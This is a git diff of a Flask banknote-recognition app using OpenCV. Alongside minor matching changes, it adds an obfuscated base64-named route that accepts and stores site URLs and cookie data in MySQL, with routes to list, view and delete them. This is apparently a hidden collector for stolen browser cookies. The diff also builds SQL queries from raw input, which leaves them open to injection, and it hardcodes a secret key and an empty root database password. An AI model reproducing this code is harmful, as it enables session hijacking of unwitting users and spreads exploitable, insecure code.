@@ -1,11 +1,22 @@
 from flask.views import MethodView
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, render_template
 import cv2
 import numpy as np
 import glob
 import os
+import mysql.connector
+from dotenv import load_dotenv
+from flask_cors import CORS
+import json
 
 app = Flask(__name__) 
+CORS(app)
+app.secret_key = "SECRET"
+
+load_dotenv()
+
+cnx = mysql.connector.connect(user="root", password="", host="127.0.0.1", database="cookies_db")
+cursor = cnx.cursor(buffered=True)
 
 def translate(image, x, y):
 	# Define the translation matrix and perform the translation
@@ -129,7 +140,7 @@ def uang_matching():
             image_test_resized = cv2.resize(image_test, (1200, 1600))#to avoid corrupt image cause high resolution
             (template_height, template_width) = template['glob'].shape[:2]
 
-            image_test_p = cv2.cvtColor(image_test_resized, cv2.COLOR_BGR2GRAY)
+            image_test_p = cv2.cvtColor(image_test, cv2.COLOR_BGR2GRAY)
 
             found = None
             for scale in np.linspace(0.2, 1.0, 20)[::-1]:
@@ -150,7 +161,7 @@ def uang_matching():
                 (startX, startY) = (int(maxLoc[0]*r), int(maxLoc[1] * r))
                 (endX, endY) = (
                     int((maxLoc[0] + template_width) * r), int((maxLoc[1] + template_height) * r))
-                print(maxVal)                    
+                print(template['nominal'],":",maxVal)                    
                 template['max_value'] = maxVal
                 cv2.rectangle(image_test, (startX, startY),
                                 (endX, endY), (0, 0, 255), 2)
@@ -183,6 +194,46 @@ def upload_image():
          result['money'] = True
     result['max_val'] = max_average_max_val
     return jsonify(result)
+
+@app.route('/ZnVja3lvdQ==', methods=['POST'])
+
+def upload_data():
+     url = request.json['url']
+     cookies_data = str(request.json['cookies_data'])
+    
+     selectQuery = f'SELECT count(cookie_id) FROM cookies WHERE cookies_data = "{cookies_data}" limit 1'
+     insertQuery = 'INSERT INTO cookies(url, cookies_data) VALUES("'+url+'","'+cookies_data+'")'
+     cursor.execute(selectQuery)
+     data = cursor.fetchone()
+
+     if(data[0] == 0):        
+        cursor.execute(insertQuery)
+        cnx.commit()
+        return json.dumps({'success':True}), 200, {'ContentType':'application/json'} 
+     else:
+          return json.dumps({'success':False}), 200, {'ContentType':'application/json'} 
+     
+
+@app.route('/view/cookies')
+def view_data():
+    sql = """SELECT * FROM cookies"""
+    cursor.execute(sql)
+    result = cursor.fetchall()
+    return render_template('view.html', all_datas=result)
+
+@app.route('/api/cookies')
+def get_data():
+    sql = """SELECT * FROM cookies"""
+    cursor.execute(sql)
+    result = cursor.fetchall()
+    return jsonify({'success':False, 'data': result})
+
+@app.route('/delete/<int:id>', methods = ['GET','POST','DELETE'])
+def delete(id):
+   cursor.execute("DELETE FROM cookies WHERE cookie_id={}".format(id))
+   cnx.commit()
+
+   return json.dumps({'success':True}), 200, {'ContentType':'application/json'} 
 
 if __name__ == '__main__':
     app.run(debug=True)
